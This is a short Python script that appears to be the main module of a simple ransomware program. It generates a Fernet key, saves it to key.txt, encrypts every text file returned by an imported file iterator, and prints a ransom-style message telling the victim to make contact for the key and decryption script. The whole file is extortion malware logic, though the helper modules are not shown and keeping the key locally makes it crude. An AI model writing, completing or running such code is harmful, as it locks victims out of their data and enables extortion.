# Imports all the needed functions and classes 
from fileIterator import fileIterator
from fernetencryption import Fernet
from encrypterScript import lineReaderAndEncrypter

# Generates the encryption key
key = Fernet.generate_key()
# Value of the key in a variable
encryptionKey = Fernet(key)

# Creates an empty file named key.txt in the directory of the script and writes the generated key to the file
keyFile = open("key.txt", "w")
keyFile.writelines(str(key))
keyFile.close()

# Calls the function that returns the list of text file names in the directory
listOfTextFiles = fileIterator()
encryptedFileCount = 0
# For loop goes through and encrypts every file in the listOfTextFile variable with the same key using the
# lineReaderAndEncrypter function
for currentFile in listOfTextFiles:
    lineReaderAndEncrypter(encryptionKey, currentFile)
    encryptedFileCount += 1
print("There were " + str(encryptedFileCount) + " files encrypted. Contact..... for the key and decryption script.")




